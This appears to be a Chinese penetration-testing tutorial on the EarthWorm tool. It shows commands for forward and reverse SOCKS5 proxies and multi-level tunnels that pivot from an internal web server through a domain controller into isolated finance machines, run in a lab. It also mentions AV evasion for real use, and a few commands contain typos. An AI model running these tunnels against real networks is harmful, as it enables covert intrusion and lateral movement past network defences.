
    少就是多，慢就是快

## 内网隐藏通信隧道技术——EW隧道

EarthWorm中的应用

在渗透测试中，EW很好用，体积小，Linux为30kb左右，windows为56kb左右。EW是一套便携式的网络穿透工具，具有SOCKS
v5服务架设和端口转发两大核心功能，可以在复杂的网络环境下完成网络穿透。

该工具能够以“正向”、“反向”、“多级级联”等方式打通一条网络隧道，直达网络深处，现在使用人数较多，如果在真实环境下使用，需要免杀

下载地址： <https://github.com/idlefire/ew>

该工具共有6种命令格式（ssocksd、rcsocks、rssocks、lcx_listen、lcx_tran）

    
    
    -l 本地要监听的端口  
    -f 要主动连接的ip  
    -g 要主动连接的端口  
    -d 要反弹到的ip  
    -e 要反弹到的端口  
    -s 工作模式  
    ​  
    工作模式支持如下：  
    lcx_tran 正向tcp端口转发，监听在本地  
    lcx_slave 反向tcp转发客户端  
    lcx_listen 反向tcp服务端  
    ssocksd 创建正向socks代理服务端，监听在本地，直接把当前环境socks代理出去  
    rssocks 创建反向socks代理服务端  
    rcsocks 反向socks代理客户端

### 使用方法：

以下所有样例，如无特殊说明代理端口均为1080，服务均为SOCKSv5代理服务.

#### 1\. 正向 SOCKS v5 服务器

    
    
    $ ./ew -s ssocksd -l 1080

2\. 反弹 SOCKS v5 服务器

这个操作具体分两步： a) 先在一台具有公网 ip 的主机A上运行以下命令：

    
    
    $ ./ew -s rcsocks -l 1080 -e 8888 

b) 在目标主机B上启动 SOCKS v5 服务 并反弹到公网主机的 8888端口

    
    
    $ ./ew -s rssocks -d 1.1.1.1 -e 8888 

成功。

3\. 多级级联

工具中自带的三条端口转发指令， 它们的参数格式分别为：

    
    
    $ ./ew -s lcx_listen -l  1080   -e 8888    
    $ ./ew -s lcx_tran   -l  1080   -f 2.2.2.3 -g 9999    
    $ ./ew -s lcx_slave  -d 1.1.1.1 -e 8888    -f 2.2.2.3  -g  9999

通过这些端口转发指令可以将处于网络深层的基于TCP的服务转发至根前,比如 SOCKS v5。 首先提供两个“二级级联”本地SOCKS测试样例：

a) lcx_tran 的用法

    
    
    $ ./ew -s ssocksd  -l 9999  
    $ ./ew -s lcx_tran -l 1080 -f 127.0.0.1 -g 9999

b) lcx_listen、lcx_slave 的用法

    
    
    $ ./ew -s lcx_listen -l 1080 -e 8888  
    $ ./ew -s ssocksd    -l 9999  
    $ ./ew -s lcx_slave  -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999

再提供一个“三级级联”的本地SOCKS测试用例以供参考`

    
    
    $ ./ew -s rcsocks -l 1080 -e 8888    
    $ ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999    
    $ ./ew -s lcx_listen -l 9999 -e 7777    
    $ ./ew -s rssocks -d 127.0.0.1 -e 7777

数据流向: SOCKS v5 -> 1080 -> 8888 -> 9999 -> 7777 -> rssocks

### 机器IP说明

外网代理机器：192.168.27.157

内网web服务器：192.168.27.170 10.10.3.100

域控：10.10.3.6 10.10.21.5

财务独立内网机器：10.10.21.2 172.16.5.2

财务核心机器：172.16.5.5

### 正向SOCKS v5服务器

以下命令使用目标为其拥有一个外网IP地址的情况：

在内网web服务器与外网代理机器之间架设隧道，访问域控

ew_for_Win.exe -s ssocksd -l 9999

![1](https://image.3001.net/images/20210802/1627845683_6106f433735cb2feab032.png!small)

![2](https://image.3001.net/images/20210802/1627845684_6106f434633ce3ea7de4f.png!small)

执行上述操作，就可以架设一个端口为9999的socks代理，然后可以使用 Proxifier 添加这个IP地址的代理即可

![3](https://image.3001.net/images/20210802/1627845685_6106f435be0ebf6f89475.png!small)

代理成功

### 反弹SOCKS5服务器

目标机器可以访问外网：

公网代理机器（win10）执行：

ew.exe -s rcsocks -l 1008 -e 888

即在公网代理机器上添加一个转接隧道，把1008端口受到的代理请求转发给888端口

![4](https://image.3001.net/images/20210802/1627845686_6106f436a515e631bfec0.png!small)

![5](https://image.3001.net/images/20210802/1627845687_6106f43753cb198b095ac.png!small)

在内网机器上执行：

ew.exe -s rssocks -d 192.168.27.157 -e 888

即为在IP地址为192.168.27.157的机器上启动SOCKS5服务并弹到代理机器的888端口

![6](https://image.3001.net/images/20210802/1627845688_6106f438383a7905fdba1.png!small)

![7](https://image.3001.net/images/20210802/1627845688_6106f438bbd0c7d07b2d3.png!small)

![8](https://image.3001.net/images/20210802/1627845689_6106f439971beb46c49e3.png!small)

![9](https://image.3001.net/images/20210802/1627845690_6106f43ae48698f42f0f0.png!small)

### 二级网络环境（a）

假设有以下机器：

A：双网卡，有公网IP，只能访问内网的B主机 内网web服务器

B：只能访问内网资源，无法访问外网 域控

首先要通过A向B传送EW，并使用ssocksd启动888端口的SOCKS代理：

B上执行：

ew_for_Win.exe -s ssocksd -l 888

![10](https://image.3001.net/images/20210802/1627845691_6106f43bdd32caa46c4a8.png!small)

A主机将1080端口收到的代理请求转发给B（10.10.3.6）的888端口，现在可以通过访问A主机的1080端口使用B的SOCKS5代理：

A执行：

ew_for_Win.exe -s lcs_tran -l 1080 10.10.3.6 -g 888

![11](https://image.3001.net/images/20210802/1627845692_6106f43c6de56e07f18d1.png!small)

即可访问A主机的外网IP的1080端口，使用在B主机上架设的SOCKS5代理了

![12](https://image.3001.net/images/20210802/1627845693_6106f43d30091339cdde6.png!small)

![13](https://image.3001.net/images/20210802/1627845694_6106f43e73de96ae8bda8.png!small)

由于代理服务器处于内环境，所以无法访问百度。

![14](https://image.3001.net/images/20210802/1627845695_6106f43f5c51da4dc0c6b.png!small)

代理成功

### 二级网络环境（b）

A：无公网IP，可以访问外网，无法访问内网资源 内网web服务器

B：只能访问内网资源，无法访问外网 域控

在代理机器，内网域控，内网web服务器上进行模拟：

先在代理机器上执行：

ew -s lcx_listen -l 1080 -e 888

![15](https://image.3001.net/images/20210802/1627845696_6106f44055525c63ba256.png!small)

即在公网代理机器中添加转接隧道，将1080端口收到的代理请求转发给888端口

B主机执行，利用socksd方式启动999端口的SOCKS代理：

ew -s ssocksd -l 999

![16](https://image.3001.net/images/20210802/1627845696_6106f440e6a965aaed9dd.png!small)

A主机执行，即将代理机器的888端口和B主机的999端口连接起来

em -s lcx_slove -d 代理机器的IP地址 -e 888 -f B主机 -g 999

![17](https://image.3001.net/images/20210802/1627845697_6106f4418117bd3db4a6d.png!small)

![18](https://image.3001.net/images/20210802/1627845698_6106f4425590c2dc9b3ca.png!small)

然后即可对代理机器的1080端口进行代理：

![19](https://image.3001.net/images/20210802/1627845699_6106f443405db96a174f0.png!small)

![20](https://image.3001.net/images/20210802/1627845700_6106f44440876c003f98e.png!small)

代理服务器为内网，所以无法访问百度

![21](https://image.3001.net/images/20210802/1627845701_6106f44512bbacb2b00ed.png!small)

代理成功

### 三级网络代理

假设有以下机器：

外网代理机器

A：无公网IP，可以访问外网 内网web服务器

B：只能访问内网资源，无法访问外网，只能被A访问 域控

C：可以被B访问并能访问核心区域 财务独立子域域控

在代理机器上执行，将1080端口收到的代理请求转发到888端口：

ew -s rcsocks -l 1080 -e 888

![22](https://image.3001.net/images/20210802/1627845701_6106f445d9dafc84bb9a4.png!small)

在A主机上将代理机器的888端口与B主机的999端口连接起来：

ew -s lcx_slave -d 代理机器 -e 888 -f B主机 -g 999

ew -s lcx_slave -d 192.168.27.157 -e 888 -f 10.10.3.6 -g 999

![23](https://image.3001.net/images/20210802/1627845702_6106f4467488fb15305c6.png!small)

在B主机上将999端口收到的代理请求转发到777端口：

ew -s lcx_listen -l 999 -e 777

![24](https://image.3001.net/images/20210802/1627845703_6106f4471d5032bc58c05.png!small)

在C主机上启动SOCKS5服务并反弹到777端口

ew -s rssocks -d B主机 -e 777

ew -s rssocks -d 10.10.21.5 -e 777

![25](https://image.3001.net/images/20210802/1627845703_6106f447bf451d447c247.png!small)

B主机显示：

![26](https://image.3001.net/images/20210802/1627845704_6106f4486d87831218f39.png!small)

代理服务器为内网服务器，无法访问百度

![27](https://image.3001.net/images/20210802/1627845705_6106f4495b909e958e91a.png!small)

![28](https://image.3001.net/images/20210802/1627845706_6106f44a9bcf53a754c9b.png!small)

![29](https://image.3001.net/images/20210802/1627845707_6106f44b9d3f97a907ac8.png!small)

代理成功

这种情况就是多级代理，在渗透测试中，遇到多层内网环境核心区域，ew可以实现多级代理传输

